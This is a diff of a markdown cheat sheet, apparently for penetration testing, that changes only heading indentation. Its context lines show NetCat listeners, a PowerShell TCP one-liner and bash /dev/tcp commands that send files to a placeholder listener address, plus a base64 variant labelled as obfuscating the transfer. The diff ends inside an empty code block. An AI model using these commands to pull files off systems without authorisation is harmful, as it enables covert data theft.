@@ -7,13 +7,13 @@
 
 ##### If you want to send the raw bytes:
 
-###### Setup NetCat listener on Linux host:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup NetCat listener on Linux host:
 
 ```
 nc -lp %ListeningPort% > file.ext
 ```
 
-###### On the Windows host run the following in PowerShell:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Windows host run the following in PowerShell:
 
 ```
 $FilePath = "$pwd\file.ext"; $LHOST = "%ListenerAddress%"; $LPORT = %ListeningPort%; $FileContents = [System.IO.File]::ReadAllBytes($FilePath); $Length = [System.BitConverter]::GetBytes($FileContents.Length); $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $NetworkStream.Write($FileContents, 0, $FileContents.Length); $NetworkStream.Close(); $TCPClient.Close()
@@ -21,13 +21,13 @@ $FilePath = "$pwd\file.ext"; $LHOST = "%ListenerAddress%"; $LPORT = %ListeningPo
 
 ##### If you want to obfuscate the data being transfered by converting it to a base64 string:
 
-###### Setup NetCat listener on Linux host:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup NetCat listener on Linux host:
 
 ```
 nc -lp %ListeningPort% | base64 -d > file.ext
 ```
 
-###### On the Windows host run the following in PowerShell:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Windows host run the following in PowerShell:
 
 ```
 $FilePath = "$pwd\file.ext"; $LHOST = "%ListenerAddress%"; $LPORT = %ListeningPort%; $Base64String = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$FilePath")); $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $StreamWriter.Write($Base64String); $StreamWriter.Close(); $NetworkStream.Close(); $TCPClient.Close()
@@ -41,19 +41,19 @@ $FilePath = "$pwd\file.ext"; $LHOST = "%ListenerAddress%"; $LPORT = %ListeningPo
 
 #### Send file from remote client to host machine:
 
-###### Setup NetCat listener on Linux host:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup NetCat listener on Linux host:
 
 ```
 nc -lp port > file.ext
 ```
 
-###### On the Linux client connect back with NetCat:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Linux client connect back with NetCat:
 
 ```
 nc -q 0 %ListenerAddress% %ListeningPort% < file.ext
 ```
 
-###### If NetCat is unavailable, on the Linux client connect back with bash:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If NetCat is unavailable, on the Linux client connect back with bash:
 
 ```
 cat file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
@@ -61,19 +61,19 @@ cat file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
 
 #### Retrieve file from host to client:
 
-###### Setup NetCat listener on Linux host:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup NetCat listener on Linux host:
 
 ```
 nc -q 0 -lp %ListenerPort% < file.ext
 ```
 
-###### On the Linux client connect back with NetCat:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Linux client connect back with NetCat:
 
 ```
 nc %ListenerAddress% %ListeningPort% > file.ext
 ```
 
-###### If NetCat is unavailable, on the Linux client connect back with bash:
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If NetCat is unavailable, on the Linux client connect back with bash:
 
 ```
 
